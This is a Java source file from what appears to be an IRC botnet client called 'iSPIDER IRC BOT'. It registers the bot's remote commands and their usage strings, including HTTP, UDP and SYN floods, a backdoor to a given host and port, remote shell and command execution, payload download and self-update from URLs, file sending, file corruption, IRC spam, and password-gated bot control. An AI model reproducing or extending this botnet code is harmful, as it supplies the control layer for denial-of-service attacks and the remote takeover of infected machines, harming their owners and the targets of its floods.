import java.util.ArrayList;
import java.util.HashMap;

class Commands {

	private static ArrayList<String> commands = new ArrayList(50);

	private static HashMap usages = new HashMap();
	private static HashMap descriptions = new HashMap();
	

	static {
		addCommands();
		addUsages();
		addDescriptions();
	}

	private static void addCommands() {
		commands.add(".commands");
		commands.add(".info");
		commands.add(".exit");
		commands.add(".quit");
		commands.add(".join");
		commands.add(".part");
		commands.add(".nick");
		commands.add(".rename");
		commands.add(".say");
		commands.add(".download");
		commands.add(".cmd");
		commands.add(".httpflood");
		commands.add(".udpflood");
		commands.add(".sflood");
		commands.add(".stopfloods");
		commands.add(".findip");
		commands.add(".shell");
		commands.add(".folder");
		commands.add(".cd");
		commands.add(".list");
		commands.add(".corrupt");
		commands.add(".update");
		commands.add(".send");
		commands.add(".zip");
		commands.add(".read");
		commands.add(".spam");
		commands.add(".stopspam");
		commands.add(".backdoor");
		commands.add(".getOS");
		commands.add(".directCommandTo");
		commands.add(".resetDirect");
		commands.add(".lock-" + ConfigDefaults.PASSWORD_BOT); //used to exit from controll mod for bots
		commands.add(".unlock-" + ConfigDefaults.PASSWORD_BOT); //used to enter at controll mod for bots
		commands.trimToSize();
	}

	private static void addUsages() {
		usages.put(".commands", ".commands");
		usages.put(".info", ".info");
		usages.put(".exit", ".exit");
		usages.put(".quit", ".quit <message>");
		usages.put(".join", ".join <channel>");
		usages.put(".part", ".part <channel>");
		usages.put(".nick", ".nick <nick>");
		usages.put(".rename", ".rename <new name>");
		usages.put(".say", ".say <channel> <''message''>");
		usages.put(".download", ".download <url> <dir [optional]>");
		usages.put(".cmd", ".cmd <command>");
		usages.put(".httpflood", ".httpflood <url> <threads> <delay> <connections>");
		usages.put(".udpflood", ".udpflood <host> <threads> <delay> <connections>");
		usages.put(".sflood", ".sflood <host> <port> <threads> <delay> <connections>");
		usages.put(".stopfloods", ".stopfloods");
		usages.put(".findip", ".findip <url [optional]>");
		usages.put(".shell", ".shell");
		usages.put(".folder", ".folder <dir>");
		usages.put(".cd", ".cd <dir>");
		usages.put(".list", ".list ");
		usages.put(".corrupt", ".corrupt <file> <message [optional]>");
		usages.put(".update", ".update <url>");
		usages.put(".send", ".send <file> <server> <port>");
		usages.put(".zip", ".zip <input> <output>");
		usages.put(".read", ".read <file> <lines>");
		usages.put(".spam", ".spam <server> <port> <channel> <channel password [optional]> <nick> <message> <times> <delay>");
		usages.put(".stopspam", ".stopspam");
		usages.put(".backdoor", ".backdoor <host> <port>");
		usages.put(".getos", ".getos");
		usages.put(".resetDirect", ".getos");
		usages.put(".directCommandTo", ".getos");
	}

	private static void addDescriptions() {
		descriptions.put(".commands", "");
		descriptions.put(".info", "");
		descriptions.put(".exit", "");
		descriptions.put(".quit", "");
		descriptions.put(".join", "");
		descriptions.put(".part", "");
		descriptions.put(".nick", "");
		descriptions.put(".rename", "");
		descriptions.put(".say", "");
		descriptions.put(".download", "");
		descriptions.put(".cmd", "");
		descriptions.put(".httpflood", "");
		descriptions.put(".udpflood", "");
		descriptions.put(".sflood", "");
		descriptions.put(".stopfloods", "");
		descriptions.put(".findip", "");
		descriptions.put(".shell", "");
		descriptions.put(".folder", "");
		descriptions.put(".cd", "");
		descriptions.put(".list", "");
		descriptions.put(".corrupt", "");
		descriptions.put(".update", "");
		descriptions.put(".send", "");
		descriptions.put(".zip", "");
		descriptions.put(".read", "");
		descriptions.put(".spam", "");
		descriptions.put(".stopspam", "");
		descriptions.put(".getOS", "");
		descriptions.put(".resetDirect", "");
		descriptions.put(".directCommandTo", "");
	}

	public static String[] getCommands() {
		Object[] objs = commands.toArray();
		String[] cmds = new String[objs.length];
		for(int i = 0; i < objs.length; i++) {
			cmds[i] = (String)objs[i];
		}
		return cmds;
	}

	public static String getUsage(String command) {
		return (String)usages.get(command);
	}

	public static String getDescription(String command) {
		return (String)descriptions.get(command);
	}

	public static boolean contain(String command) {
		return commands.contains(command);
	}

	public static void printCommands(IRC irc, String channel) {
		irc.sendMessage(channel, ".:: iSPIDER IRC BOT COMMANDS ::.");
		String[] commands = getCommands();
		for(int i = 0; i < commands.length; i++) {
			irc.sendMessage(channel, " " + getUsage(commands[i]) + " " + getDescription(commands[i]) + "");
		}
	}

}